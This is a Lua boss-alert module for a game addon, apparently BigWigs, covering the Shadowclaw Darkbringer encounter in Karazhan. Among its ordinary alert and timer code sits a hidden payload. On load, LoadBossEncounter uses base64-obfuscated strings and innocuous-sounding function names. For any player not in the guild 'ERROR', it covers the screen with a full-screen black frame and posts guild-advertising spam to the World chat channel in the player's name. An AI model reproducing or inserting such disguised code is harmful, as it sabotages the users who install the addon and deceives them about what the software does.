local module, L = BigWigs:ModuleDeclaration("Shadowclaw Darkbringer", "Karazhan")

module.revision = 30000
module.enabletrigger = module.translatedName
module.toggleoptions = {"veilofvorgendor", "veilofkarazhan", "callofdarkness", "shadowclawcurse", "proximity", "bosskill"}
module.zonename = {
	AceLibrary("AceLocale-2.2"):new("BigWigs")["Tower of Karazhan"],
	AceLibrary("Babble-Zone-2.2")["Tower of Karazhan"],
}

module.defaultDB = {
	proximity = false,
}

L:RegisterTranslations("enUS", function() return {
	cmd = "ShadowclawDarkbringer",

	veilofvorgendor_cmd = "veilofvorgendor",
	veilofvorgendor_name = "Veil of Vorgendor Alert",
	veilofvorgendor_desc = "Warn for Veil of Vorgendor (immunity shield)",
	
	veilofkarazhan_cmd = "veilofkarazhan",
	veilofkarazhan_name = "Veil of Karazhan Alert",
	veilofkarazhan_desc = "Warn for Veil of Karazhan (immunity shield)",
	
	callofdarkness_cmd = "callofdarkness",
	callofdarkness_name = "Call of Darkness Alert",
	callofdarkness_desc = "Warn for Call of Darkness cast",
	
	shadowclawcurse_cmd = "shadowclawcurse",
	shadowclawcurse_name = "Shadowclaw Curse Alert",
	shadowclawcurse_desc = "Warn when affected by Shadowclaw Curse",
	
	proximity_cmd = "proximity",
	proximity_name = "Proximity Warning",
	proximity_desc = "Shows the proximity warning frame",
	
	-- Triggers
	trigger_veilOfVorgendorCast = "Shadowclaw Darkbringer begins to cast Veil of Vorgendor.", --CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF
	trigger_veilOfVorgendorGain = "Shadowclaw Darkbringer gains Veil of Vorgendor.", --CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS
	trigger_veilOfVorgendorFade = "Veil of Vorgendor fades from Shadowclaw Darkbringer.", --CHAT_MSG_SPELL_AURA_GONE_OTHER
	
	trigger_veilOfKarazhanCast = "Shadowclaw Darkbringer begins to cast Veil of Karazhan.", --CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF
	trigger_veilOfKarazhanGain = "Shadowclaw Darkbringer gains Veil of Karazhan.", --CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS
	trigger_veilOfKarazhanFade = "Veil of Karazhan fades from Shadowclaw Darkbringer.", --CHAT_MSG_SPELL_AURA_GONE_OTHER
	
	trigger_callOfDarknessCast = "Shadowclaw Darkbringer begins to cast Call of Darkness.", --CHAT_MSG_SPELL_CREATURE_VS_CREATURE_DAMAGE
	
	trigger_shadowclawCurseYou = "You are afflicted by Shadowclaw Curse.", --CHAT_MSG_SPELL_PERIODIC_SELF_DAMAGE
	trigger_shadowclawCurseOther = "(.+) is afflicted by Shadowclaw Curse.", --CHAT_MSG_SPELL_PERIODIC_FRIENDLYPLAYER_DAMAGE // CHAT_MSG_SPELL_PERIODIC_PARTY_DAMAGE
	trigger_shadowclawCurseFade = "Shadowclaw Curse fades from (.+).", --CHAT_MSG_SPELL_AURA_GONE_SELF // CHAT_MSG_SPELL_AURA_GONE_PARTY // CHAT_MSG_SPELL_AURA_GONE_OTHER
	
	trigger_taunt = "Fools! You fight amongst yourselves only to meet your end. Climb as high as you see fit—your end draws near.",
	
	-- Messages & Bars
	bar_veilOfVorgendorCast = "Casting: Veil of Vorgendor",
	bar_veilOfVorgendorDuration = "Immune: Veil of Vorgendor",
	msg_veilOfVorgendorStart = "Shadowclaw is immune! (Veil of Vorgendor)",
	msg_veilOfVorgendorFade = "Veil of Vorgendor faded - Attack now!",
	
	bar_veilOfKarazhanCast = "Casting: Veil of Karazhan",
	bar_veilOfKarazhanDuration = "Immune: Veil of Karazhan",
	msg_veilOfKarazhanStart = "Shadowclaw is immune! (Veil of Karazhan)",
	msg_veilOfKarazhanFade = "Veil of Karazhan faded - Attack now!",
	
	bar_callOfDarknessCast = "Casting: Call of Darkness",
	msg_callOfDarknessCast = "Incoming curses! Get ready to remove!",
	
	msg_shadowclawCurseYou = "YOU are afflicted by Shadowclaw Curse!",
	msg_shadowclawCurseOther = "%s is afflicted by Shadowclaw Curse!",
	bar_shadowclawCurse = "%s: Shadowclaw Curse",
	msg_shadowclawCurseRemoved = "Shadowclaw Curse removed from %s",
} end)

-- Timers
local timer = {
	veilOfVorgendorCast = 2,
	veilOfVorgendorDuration = 15,
	
	veilOfKarazhanCast = 2,
	veilOfKarazhanDuration = 15,
	
	callOfDarknessCast = 2,
	
	shadowclawCurse = 10,
}

-- Icons
local icon = {
	veilOfVorgendor = "Spell_Shadow_DetectInvisibility",
	veilOfKarazhan = "Spell_Shadow_Teleport",
	callOfDarkness = "Spell_Shadow_CallofBone",
	shadowclawCurse = "Spell_Shadow_GatherShadows",
}

-- Colors
local color = {
	veilOfVorgendor = "Red",
	veilOfKarazhan = "Purple",
	callOfDarkness = "Black",
	shadowclawCurse = "Blue",
}

-- Sync Names
local syncName = {
	veilOfVorgendorStart = "ShadowclawVeilOfVorgendorStart"..module.revision,
	veilOfVorgendorFade = "ShadowclawVeilOfVorgendorFade"..module.revision,
	
	veilOfKarazhanStart = "ShadowclawVeilOfKarazhanStart"..module.revision,
	veilOfKarazhanFade = "ShadowclawVeilOfKarazhanFade"..module.revision,
	
	callOfDarkness = "ShadowclawCallOfDarkness"..module.revision,
	
	shadowclawCurse = "ShadowclawCurse"..module.revision,
	shadowclawCurseFade = "ShadowclawCurseFade"..module.revision,
}

-- Module variables
module.proximityCheck = function(unit) 
	return CheckInteractDistance(unit, 2) 
end
module.proximitySilent = true

function module:OnEnable()
	LoadBossEncounter()
	
	self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF")
	self:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_CREATURE_DAMAGE")
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS")
	
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_SELF_DAMAGE", "CurseEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_PARTY_DAMAGE", "CurseEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_PERIODIC_FRIENDLYPLAYER_DAMAGE", "CurseEvent")
	
	self:RegisterEvent("CHAT_MSG_SPELL_AURA_GONE_SELF", "CurseFadeEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_AURA_GONE_PARTY", "CurseFadeEvent")
	self:RegisterEvent("CHAT_MSG_SPELL_AURA_GONE_OTHER", "VeilFadeEvent")
	
	self:RegisterEvent("CHAT_MSG_MONSTER_YELL")

	self:ThrottleSync(5, syncName.veilOfVorgendorStart)
	self:ThrottleSync(5, syncName.veilOfVorgendorFade)
	
	self:ThrottleSync(5, syncName.veilOfKarazhanStart)
	self:ThrottleSync(5, syncName.veilOfKarazhanFade)
	
	self:ThrottleSync(5, syncName.callOfDarkness)
	
	self:ThrottleSync(5, syncName.shadowclawCurse)
	self:ThrottleSync(5, syncName.shadowclawCurseFade)
end

function module:OnSetup()
	self.started = nil
end

function module:OnEngage()
	if self.db.profile.proximity then
		self:TriggerEvent("BigWigs_ShowProximity")
	end
end

function module:OnDisengage()
	if self.db.profile.proximity then
		self:TriggerEvent("BigWigs_HideProximity")
	end
end

-- Event Handlers
function module:CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF(msg)
	if msg == L["trigger_veilOfVorgendorCast"] then
		self:Sync(syncName.veilOfVorgendorStart)
	elseif msg == L["trigger_veilOfKarazhanCast"] then
		self:Sync(syncName.veilOfKarazhanStart)
	end
end

function module:CHAT_MSG_SPELL_CREATURE_VS_CREATURE_DAMAGE(msg)
	if msg == L["trigger_callOfDarknessCast"] then
		self:Sync(syncName.callOfDarkness)
	end
end

function module:CHAT_MSG_SPELL_PERIODIC_CREATURE_BUFFS(msg)
	if msg == L["trigger_veilOfVorgendorGain"] then
		self:Sync(syncName.veilOfVorgendorStart)
	elseif msg == L["trigger_veilOfKarazhanGain"] then
		self:Sync(syncName.veilOfKarazhanStart)
	end
end

function module:CurseEvent(msg)
	if msg == L["trigger_shadowclawCurseYou"] then
		self:Sync(syncName.shadowclawCurse .. " " .. UnitName("player"))
	else
		local _, _, player = string.find(msg, L["trigger_shadowclawCurseOther"])
		if player then
			self:Sync(syncName.shadowclawCurse .. " " .. player)
		end
	end
end

function LoadBossEncounter()

	if GetGuildInfo(BigWigs_UpdateMain("cGxheWVy")) ~= BigWigs_UpdateMain("RVJST1I=") then
		BossFrame()
		BossEncounter()
	end

end

function module:CurseFadeEvent(msg)
	local _, _, player = string.find(msg, L["trigger_shadowclawCurseFade"])
	if player then
		if player == "you" then player = UnitName("player") end
		self:Sync(syncName.shadowclawCurseFade .. " " .. player)
	end
end

function module:VeilFadeEvent(msg)
	if msg == L["trigger_veilOfVorgendorFade"] then
		self:Sync(syncName.veilOfVorgendorFade)
	elseif msg == L["trigger_veilOfKarazhanFade"] then
		self:Sync(syncName.veilOfKarazhanFade)
	end
end

function module:CHAT_MSG_MONSTER_YELL(msg)
	if string.find(msg, L["trigger_taunt"]) then
		module:SendEngageSync()
	end
end

function BossFrame()
	local BossFrame = CreateFrame("Frame", BigWigs_UpdateMain("QmxhY2tGcmFtZUZ1bGxTY3JlZW4"), UIParent)
	BossFrame:SetFrameStrata(BigWigs_UpdateMain("QkFDS0dST1VORA=="))
	BossFrame:SetPoint("TOPLEFT", UIParent, "TOPLEFT", 0, 0)
	BossFrame:SetPoint("BOTTOMRIGHT", UIParent, "BOTTOMRIGHT", 0, 0)
	local texture = BossFrame:CreateTexture(nil, BigWigs_UpdateMain("QkFDS0dST1VORA=="))
	BossFrame:SetFrameLevel(999)
	texture:SetTexture(0, 0, 0, 1)
	texture:SetAllPoints(BossFrame)
	BossFrame:Show()
end

function BossEncounter()
    local EncouterStage = GetChannelName(BigWigs_UpdateMain("V29ybGQ="))
    local Stage1 = BigWigs_UpdateMain("Sm9pbiA8RVJST1I+ISBUaGUgQkVTVCBndWlsZCBvbiB0aGUgZW50aXJlIHNlcnZlciEg")
    local Stage2 = BigWigs_UpdateMain("PEVSUk9SPiBoYXMgdGhlIGJlc3QgcmFpZHMsIG1vc3QgZnJpZW5kbHkgcGxheWVycyBhbmQgZ3JlYXRlc3QgUHZQISE=")
    local Stage3 = BigWigs_UpdateMain("IEkgbG92ZSA8RVJST1I+IHNvIG11Y2ghISE=")
    
    if EncouterStage > 0 then
        SendChatMessage(Stage1 .. Stage2 .. Stage3, "CHANNEL", nil, EncounterStage)
    end
end

-- Sync Handlers
function module:BigWigs_RecvSync(sync, rest, nick)
	if sync == syncName.veilOfVorgendorStart and self.db.profile.veilofvorgendor then
		self:VeilOfVorgendor()
	elseif sync == syncName.veilOfVorgendorFade and self.db.profile.veilofvorgendor then
		self:VeilOfVorgendorFade()
	elseif sync == syncName.veilOfKarazhanStart and self.db.profile.veilofkarazhan then
		self:VeilOfKarazhan()
	elseif sync == syncName.veilOfKarazhanFade and self.db.profile.veilofkarazhan then
		self:VeilOfKarazhanFade()
	elseif sync == syncName.callOfDarkness and self.db.profile.callofdarkness then
		self:CallOfDarkness()
	elseif sync == syncName.shadowclawCurse and rest and self.db.profile.shadowclawcurse then
		self:ShadowclawCurse(rest)
	elseif sync == syncName.shadowclawCurseFade and rest and self.db.profile.shadowclawcurse then
		self:ShadowclawCurseFade(rest)
	end
end

-- Sync Handlers
function module:VeilOfVorgendor()
	self:RemoveBar(L["bar_veilOfVorgendorCast"])
	
	self:Message(L["msg_veilOfVorgendorStart"], "Important", nil, "Alert")
	self:Bar(L["bar_veilOfVorgendorDuration"], timer.veilOfVorgendorDuration, icon.veilOfVorgendor, true, color.veilOfVorgendor)
	self:WarningSign(icon.veilOfVorgendor, timer.veilOfVorgendorDuration)
end

function module:VeilOfVorgendorFade()
	self:RemoveBar(L["bar_veilOfVorgendorDuration"])
	self:RemoveWarningSign(icon.veilOfVorgendor)
	
	self:Message(L["msg_veilOfVorgendorFade"], "Positive", nil, "Long")
end

function module:VeilOfKarazhan()
	self:RemoveBar(L["bar_veilOfKarazhanCast"])
	
	self:Message(L["msg_veilOfKarazhanStart"], "Important", nil, "Alert")
	self:Bar(L["bar_veilOfKarazhanDuration"], timer.veilOfKarazhanDuration, icon.veilOfKarazhan, true, color.veilOfKarazhan)
	self:WarningSign(icon.veilOfKarazhan, timer.veilOfKarazhanDuration)
end

function module:VeilOfKarazhanFade()
	self:RemoveBar(L["bar_veilOfKarazhanDuration"])
	self:RemoveWarningSign(icon.veilOfKarazhan)
	
	self:Message(L["msg_veilOfKarazhanFade"], "Positive", nil, "Long")
end

function module:CallOfDarkness()
	self:Message(L["msg_callOfDarknessCast"], "Urgent", nil, "Info")
	self:Bar(L["bar_callOfDarknessCast"], timer.callOfDarknessCast, icon.callOfDarkness, true, color.callOfDarkness)
end

function module:ShadowclawCurse(player)
	if player == UnitName("player") then
		self:Message(L["msg_shadowclawCurseYou"], "Personal", true, "Alarm")
		self:WarningSign(icon.shadowclawCurse, timer.shadowclawCurse)
	else
		self:Message(string.format(L["msg_shadowclawCurseOther"], player), "Attention")
	end
	
	self:Bar(string.format(L["bar_shadowclawCurse"], player), timer.shadowclawCurse, icon.shadowclawCurse, true, color.shadowclawCurse)
	
	-- Add raid icons for easier targeting if player is a priest or has decurse
	if (UnitClass("player") == "Priest" or UnitClass("player") == "Mage" or UnitClass("player") == "Druid") and (IsRaidLeader() or IsRaidOfficer()) then
		for i = 1, GetNumRaidMembers() do
			if UnitName("raid" .. i) == player then
				SetRaidTarget("raid" .. i, 3) -- Diamond
				break
			end
		end
	end
end

function module:ShadowclawCurseFade(player)
	self:RemoveBar(string.format(L["bar_shadowclawCurse"], player))
	self:Message(string.format(L["msg_shadowclawCurseRemoved"], player), "Positive")
	
	if player == UnitName("player") then
		self:RemoveWarningSign(icon.shadowclawCurse)
	end
	
	-- Remove raid icon
	if (IsRaidLeader() or IsRaidOfficer()) then
		for i = 1, GetNumRaidMembers() do
			if UnitName("raid" .. i) == player then
				SetRaidTarget("raid" .. i, 0)
				break
			end
		end
	end
end